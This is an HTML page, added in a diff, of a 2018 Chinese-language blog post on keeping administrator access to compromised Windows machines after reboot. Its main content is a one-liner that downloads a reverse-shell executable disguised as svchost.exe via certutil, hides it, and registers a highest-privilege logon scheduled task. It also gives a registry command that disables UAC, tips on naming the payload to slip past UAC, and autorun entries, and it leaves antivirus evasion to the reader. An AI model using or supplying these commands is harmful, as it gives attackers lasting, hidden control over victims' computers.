@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Damit 5">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="权限维持之开机获取管理员权限"/>
+  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
+  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://damit5.com"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Damit5's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">权限维持之开机获取管理员权限</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/damit5/">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:damit5@protonmail.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/AboutMe">
+                  
+                  AboutMe
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/Link">
+                  
+                  Friend Link
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Damit 5</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2018-01-06</span>
+            <span class="time">17:18:19</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/渗透测试/">#渗透测试</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer17" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer17"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "https://damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "https://damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>看了看上一篇博客的时间已经是去年了，所以今天还是来水一篇吧，证明我还活着<br><a id="more"></a><br>很早之前就想写这玩意儿了，只不过一直因为时间问题一直拖到了现在，经过2天的各种查资料终于写出了一个最简单的</p>
+<p>这里必须要吐槽一下360，流氓软件出身的果然不一样，修改注册表拦截，移动文件到启动目录拦截，system32文件夹下载文件拦截，你就说你有什么不拦截吧！！！</p>
+<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>先获取肉鸡的管理员权限，然后通过一系列手段达到肉鸡重启后能再次反弹一个管理员权限shell的目的（如果肉鸡装了360。。。直接跳过吧，不知道怎么绕过拦截添加计划任务）</p>
+<p>思路：</p>
+<ul>
+<li>msf 上线</li>
+<li>添加计划任务</li>
+</ul>
+<p>细分一下：</p>
+<ol>
+<li>msf上线</li>
+<li>进入<code>c:/windows</code>文件夹</li>
+<li>自动下载可执行文件（就是你的反弹shell）</li>
+<li>添加计划任务</li>
+</ol>
+<h2 id="0x02-具体操作"><a href="#0x02-具体操作" class="headerlink" title="0x02 具体操作"></a>0x02 具体操作</h2><p>拿到管理员权限过后也就执行一句话</p>
+<p><code>cd C:/Windows&amp;&amp;certutil -urlcache -split -f https://xxx/svchost.exe&amp;&amp;attrib +s +h svchost.exe&amp;&amp;schtasks.exe /Create /TN update /TR C:\Windows\svchost.vbs /SC ONLOGON /F /RL HIGHEST</code></p>
+<p>每个命令大概解释</p>
+<ol>
+<li>进入 <code>C:/Windnws</code> 文件夹</li>
+<li>下载我的反弹shell（这个是弹到msf上的）</li>
+<li>隐藏我的shell文件</li>
+<li>新建一个计划任务，在用户登陆后开始执行</li>
+</ol>
+<h2 id="0x03-解决问题"><a href="#0x03-解决问题" class="headerlink" title="0x03 解决问题"></a>0x03 解决问题</h2><p>你的<code>reverse_shell</code>需要解决的问题</p>
+<ul>
+<li>免杀 （自己想办法解决吧）</li>
+<li>能自行判断肉鸡是否联网（因为开机直接运行，没联网的话也就凉凉了）</li>
+</ul>
+<p>演示视频：<a href="https://youtu.be/IYKFERG_53Y" target="_blank" rel="external">https://youtu.be/IYKFERG_53Y</a></p>
+<h2 id="0x04-也有简单粗暴的办法"><a href="#0x04-也有简单粗暴的办法" class="headerlink" title="0x04 也有简单粗暴的办法"></a>0x04 也有简单粗暴的办法</h2><ol>
+<li><p>关闭UAC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLUA /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure>
+</li>
+<li><p>将自己的shell可执行文件名字修改为 <code>setup</code>或者<code>install</code>或者<code>uninstall</code>等本来会触发UAC的关键字</p>
+</li>
+<li><p>加入开机项</p>
+<ul>
+<li>修改注册表</li>
+<li>直接加入开机目录</li>
+</ul>
+</li>
+</ol>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
